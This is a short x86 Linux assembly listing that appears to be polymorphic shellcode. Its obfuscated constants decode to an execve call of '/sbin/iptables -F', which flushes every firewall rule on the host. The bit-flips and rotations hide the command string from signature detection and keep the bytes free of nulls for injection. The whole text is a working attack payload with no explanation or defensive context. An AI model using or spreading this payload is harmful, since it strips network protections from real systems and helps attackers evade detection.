global _start

section .text

_start:
	xor eax,eax
	push eax
	push word 0x462d
	mov edi, esp
	push eax
	mov edx, 0x8c9a939d
	not edx
	push edx
	mov edx, 0x17470696
	ror edx, 4
	push edx
	mov ecx, 0x22f6e696
	rol ecx, 4
	push ecx
	mov edx, 0x8cd0d0d0
	not edx
	push edx
	mov ebx, esp
	push eax
	push edi
	push ebx
	mov ecx, esp
	mov edx, eax
	or al, 11
	int 0x80

